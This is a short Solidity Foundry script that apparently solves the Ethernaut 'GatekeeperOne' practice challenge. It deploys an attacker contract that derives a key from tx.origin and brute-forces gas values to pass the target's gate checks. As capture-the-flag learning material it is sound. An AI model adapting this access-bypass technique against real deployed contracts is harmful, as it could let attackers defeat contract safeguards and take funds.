// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {Script, console} from "forge-std/script.sol";

contract GatekeeperSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attack = new Attacker();
        attack.enterTheGateKey();
        vm.stopBroadcast();
    }
}

contract Attacker {
    GatekeeperOne gate = GatekeeperOne(0xCA9BaF22Ccd680d236Da28026Ae728a27aDae7b3);
    address origin = tx.origin;

    function enterTheGateKey() public {
        uint16 k16 = uint16(uint160(origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        bytes8 key = bytes8(k64);

        for (uint256 i = 0; i < 120; i++) {
            (bool success,) =
                address(gate).call{gas: i + 150 + 8191 * 10}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
